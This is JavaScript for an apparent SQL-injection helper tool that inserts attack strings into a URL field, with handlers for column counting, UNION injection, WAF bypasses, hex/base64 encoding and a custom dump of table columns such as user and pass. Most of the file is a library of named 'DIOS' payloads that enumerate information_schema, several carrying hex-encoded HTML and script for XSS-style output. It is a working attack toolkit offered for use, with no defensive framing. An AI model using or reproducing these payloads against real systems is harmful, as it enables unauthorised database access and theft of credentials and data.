document.addEventListener('DOMContentLoaded', function() {
    const urlBox = document.getElementById('url_box');
    const status = document.getElementById('status');

    function insertAtCursor(text) {
        const start = urlBox.selectionStart;
        const end = urlBox.selectionEnd;
        const val = urlBox.value;
        urlBox.value = val.substring(0, start) + text + val.substring(end);
        urlBox.selectionStart = urlBox.selectionEnd = start + text.length;
        urlBox.focus();
        status.textContent = "Injected: " + text.substring(0, 15) + "...";
    }

    const extractionHandlers = {
        dumpDataCustom: () => {
            let tbl = prompt("Table Name?", "admin");
            let colsInput = prompt("Columns (e.g: user,pass)", "user,pass");
            
            if (tbl && colsInput) {
                let colArray = colsInput.split(',').map(c => c.trim());
                let finalCols = [];
                for (let i = 0; i < 4; i++) {
                    finalCols.push(colArray[i] ? colArray[i] : "0x20");
                }
                let concatPayload = finalCols.join(',0x3a,');
                let payload = `(SeLeCt(@x)from(SeLeCt(@x:=0x00),(SeLeCt(@x)FROM(${tbl})WHERE(@x)IN(@x:=CONCAT(0x20,@x,${concatPayload},0x3c62723e))))x)`;
                insertAtCursor(payload);
                status.textContent = `[+] Dumping ${colArray.length} columns from ${tbl}`;
            }
        }
    };

    const promptLogic = {
        colCount: (template) => {
            let n = prompt("Column Count?", "10");
            if (n && !isNaN(n)) insertAtCursor(template.replace("{n}", n));
        },
        union: (mode) => {
            let n = prompt("How many columns?", "10");
            if (!n || isNaN(n)) return;
            let count = parseInt(n);
            let res = "";
            if (mode === 'null') res = ` UnIoN SeLeCt ${new Array(count).fill('null').join(',')}`;
            else if (mode === 'num') res = ` UnIoN SeLeCt ${Array.from({length: count}, (_, i) => i+1).join(',')}`;
            else if (mode === 'bypass') res = ` UnIoN(SeLeCt${Array.from({length: count}, (_, i) => `(${i + 1})`).join(',')})`;
            insertAtCursor(res + "-- -");
        },
        joinunion: () => {
            let n = prompt("How many columns to join?", "10");
            if (!n || isNaN(n)) return;
            let count = parseInt(n);
            let parts = Array.from({length: count}, (_, i) => {
                let char = String.fromCharCode(97 + (i % 26));
                let suffix = i >= 26 ? Math.floor(i / 26) : "";
                return `(SeLeCt ${i + 1})${char}${suffix}`;
            });
            insertAtCursor(` UnIoN SeLeCt * from ${parts.join(' join ')}-- -`);
        },
        quickReplace: () => {
            let val = urlBox.value;
            let find = prompt("ဘယ်စာသားကို အစားထိုးမလဲ?", "null");
            if (!find) return;
            let replaceWith = prompt(`"${find}" နေရာမှာ ဘာထည့်မလဲ?`, "8");
            if (replaceWith === null) return;
            urlBox.value = val.split(find).join(replaceWith);
        },
        // FIXED: waf function ကို promptLogic object ထဲ သေချာ ပြန်ထည့်လိုက်ပါတယ်
        waf1: () => {
            let input = prompt("UnIoN နေရာမှာ ဘာစာသား အစားထိုးမလဲ?", "UnIoN");
            if (input) {
                let payload = `/*!00024${input}/**8**/*/`;
                insertAtCursor(payload);
                status.textContent = `[+] WAF Bypass with: ${input}`;
            }
        },
		waf2: () => {
            let input = prompt("UnIoN နေရာမှာ ဘာစာသား အစားထိုးမလဲ?", "UnIoN");
            if (input) {
                let payload = `%23xyz%0A${input}`;
                insertAtCursor(payload);
                status.textContent = `[+] WAF Bypass with: ${input}`;
            }
        }
    };

    const encoder = {
        processSeLeCt: (transformFunc) => {
            let start = urlBox.selectionStart;
            let end = urlBox.selectionEnd;
            let val = urlBox.value;
            let selected = val.substring(start, end);

            if (start === end) {
                urlBox.value = transformFunc(val);
            } else {
                let transformed = transformFunc(selected);
                urlBox.value = val.substring(0, start) + transformed + val.substring(end);
                urlBox.setSelectionRange(start, start + transformed.length);
            }
            urlBox.focus();
        },
        urlEnc: () => encoder.processSeLeCt(t => encodeURIComponent(t)),
        urlDec: () => encoder.processSeLeCt(t => decodeURIComponent(t)),
        hexEnc: () => encoder.processSeLeCt(t => "0x" + Array.from(t).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')),
        hexDec: () => encoder.processSeLeCt(t => {
            let s = t.startsWith("0x") ? t.slice(2) : t;
            return s.match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || t;
        }),
        b64Enc: () => encoder.processSeLeCt(t => btoa(t)),
        b64Dec: () => encoder.processSeLeCt(t => { try { return atob(t); } catch { return t; }}),
        reverse: () => encoder.processSeLeCt(t => t.split("").reverse().join(""))
    };

    const predatorData = {
        replace: [{ name: "Quick Swap", func: () => promptLogic.quickReplace(), desc: "စာသား အစားထိုးမယ်" }],
        sql: [{ name: "OrderBy", func: () => promptLogic.colCount(" order by {n}-- -"), desc: "Find Columns" }],
        union: [
            { name: "UnIoN Null", func: () => promptLogic.union('null'), desc: "Null Injection" },
            { name: "UnIoN Num", func: () => promptLogic.union('num'), desc: "Numbers Injection" },
            { name: "JoinUnIoN", func: () => promptLogic.joinunion(), desc: "JoinUnion" },
            { name: "Union(select(1))", func: () => promptLogic.union('bypass'), desc: "Union(select(1))" },
            { name: "WaFDi0S", code: " (/*!00024SeLeCt/**8**/*/(@x)/*!00024from/**8**/*/(/*!00024SeLeCt/**8**/*/(@x:=0x00),(SeLeCt(0)/*!From/**8**/*/(/*!00024information_schema.columns/**8**/*/)/*!00024where/**8**/*/(table_schema=database/**8**/()) and (0x00) in (@x:=/*!00024coNcat/**8**/*/(@x,0x3c6c693e,/*!00024table_name/**8**/*/,0x3a3a,/*!00024column_name/**8**/*/))))x)" },
            { name: "DataDump", func: () => extractionHandlers.dumpDataCustom(), desc: "Dump Data from Table" }
        ],
        wafunion: [
            { name: "01", code: "having (SeLeCt NULL) IS NOT NULL UnIoN SeLeCt", desc: "HAVING clause.." },
            { name: "02", code: " uni<on all=\"\" sel=\"\">/*!20000%0d%0aUnIoN*/+/*!20000%0d%0aSeLeCt*/", desc: "CRLF + Version Comment bypass" },
            { name: "03", code: " %23xyz%0AUnIoN%23xyz%0ASeLeCt%2b", desc: "%23xyz%0AUnIoN%23..." },
            { name: "04", code: " /*!00024%55nIoN*/ /*!00024%53eLeCt*/", desc: "/*!00024%55nIoN*/ /*!00024%53eLeC..." },
            { name: "| null", code: " | null UnIoN SeLeCt", desc: "| null UnIoN SeLeCt 1..." },
            { name: "^ null", code: " ^ null UnIoN SeLeCt", desc: "^ null UnIoN SeLeCt 1,2..." },
            { name: "^ true", code: " ^ true UnIoN SeLeCt", desc: "^ true UnIoN SeLeCt 1,2..." },
            { name: " % 1 UnIoN", code: " % 1 UnIoN SeLeCt", desc: "% 1 UnIoN SeLeCt 1,2..." },
            { name: "mod(1,1)", code: " and mod(1,1) UnIoN SeLeCt", desc: "and mod(1,1) UnIoN SeLeCt 1,2..." },
            { name: "find_in_set", code: " and find_in_set('a','b,c') UnIoN SeLeCt", desc: "and find_in_set('a','b,c')UnIoN..." },
            { name: "('x','abc')", code: " and locate('x','abc') UnIoN SeLeCt", desc: "locate('x','abc')..." },
            { name: "/*!and*/1like0", code: " /*!and*/ 1 like 0 UnIoN SeLeCt", desc: "/*!and*/ 1 like 0 UnIoN SeLeCt..." },
            { name: "having(SeLeCt 0)", code: " having (SeLeCt 0) UnIoN SeLeCt", desc: "having (SeLeCt 0) UnIoN SeLeCt..." },
            { name: "14", code: " 'UnI'||'on'+SeLeCt'", desc: "'UnI'||'on'+SeLeCt'..." },
            { name: "15", code: " ’UnI”On’+'SeL”ECT’", desc: "’UnI”On’+'SeL”ECT’..." },
            { name: "16", code: " and false UnIoN SeLeCt", desc: "and false UnIoN SeLeCt..." },
            { name: "&0", code: " & 0 UnIoN SeLeCt", desc: "& 0 UnIoN SeLeCt..." },
            { name: "18", code: " and 0 UnIoN SeLeCt", desc: "and 0 UnIoN SeLeCt..." },
            { name: "19", code: " having 0 UnIoN SeLeCt", desc: "having 0 UnIoN SeLeCt..." },
            { name: "div0", code: " div 0 UnIoN SeLeCt", desc: "div 0 UnIoN SeLeCt..." },
            { name: "andNull", code: " and null UnIoN SeLeCt", desc: "and null UnIoN SeLeCt..." },
            { name: "UNIUnIoNON", code: " UNIUnIoNON SELSeLeCtECT", desc: "Double Key..." }
        ],
        waf: [
            { name: "/*!00024S/**8**/*/", func: () => promptLogic.waf1(), desc: "Custom String Injection" },
			{ name: "%23xyz%0A", func: () => promptLogic.waf2(), desc: "%23xyz%0A" }
        ],
        mysqldios: [
            { name: "DIOS1", code: "(/*!00024SeLeCt/**8**/*/(@x)/*!00024from/**8**/*/(/*!00024SeLeCt/**8**/*/(@x:=0x00),(SeLeCt(0)/*!From/**8**/*/(/*!00024information_schema.columns/**8**/*/)/*!00024where/**8**/*/(table_schema=database/**8**/()) and (0x00) in (@x:=/*!00024coNcat/**8**/*/(@x,0x3c6c693e,/*!00024table_name/**8**/*/,0x3a3a,/*!00024column_name/**8**/*/))))x)" },
            { name: "LogicVariable", code: "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)" },
			{ name: "Dr.Zer0", code: "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))" },
			{ name: "T-pro", code: "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)" },
			{ name: "tr0janWaF", code: "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/" },
			{ name: "tr0jan", code: "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e21212120416c69204b68616e202121213a3a3a3a3c666f6e7420636f6c6f723d626c75653e ,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)" },
			{ name: "MakMan1", code: "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)" },
			{ name: "MakMan2", code: "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)" },
			{ name: "MadBlood1", code: "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))" },
			{ name: "MadBloodWaF", code: "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)" },
			{ name: "ZenWaf", code: "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)" },
			{ name: "Zen", code: "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)" },
			{ name: "AKDK1", code: "concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a6563746564206279416c69204b68616e3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=database())and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)" },
			{ name: "AKDK2", code: "concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a626c75653b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e28496e6a656374656420627920416c69204b68616e293c2f666f6e743e,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))" },
			{ name: "AKDK3", code: "/*!50000concat*/(0x3c666f6e7420636f6c6f723d626c61636b2073697a653d343e3c623e2a2a20496e6a656374656420427920416c69204b68616e202a2a2a3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e2073697a653d343e3c623e446174616261736520bb20,database(),0x20ab,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e5573657220bb20,user(),0x20ab,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c652073697a653d343e3c623e56657273696f6e20bb20,version(),0x20ab,0x3c2f666f6e743e,0x3c62723e,(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a))" },
			{ name: "AhmedX", code: "concat(0x3c7363726970743e616c6572742822496e6a656374656420427920416c69204b68616e,0x5c6e,0x56657273696f6e203a3a20,version(),0x5c6e,0x4461746162617365203a3a20,database(),0x5c6e,0x55736572203a3a20,user(),0x5c6e,(select group_concat(table_name,0x3a3a3a3a,column_name+separator+0x5c6e) from information_schema.columns where table_schema=database()),0x5c6e,0x22293c2f7363726970743e)" },
			{ name: "AhmedXss", code: "/*!00000concat*/(0x3c7363726970743e616c6572742822496e6a65637465642b58535345442062792041686d65643a3a,0x5c6e,version(),0x5c6e,database(),0x5c6e,user(),0x5c6e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20" },
			{ name: "r0ot@h", code: "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e414c69204b48614e203a3a ,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)" },
			{ name: "Ajkaro", code: "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)" },
			{ name: "Rummy", code: "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)" },
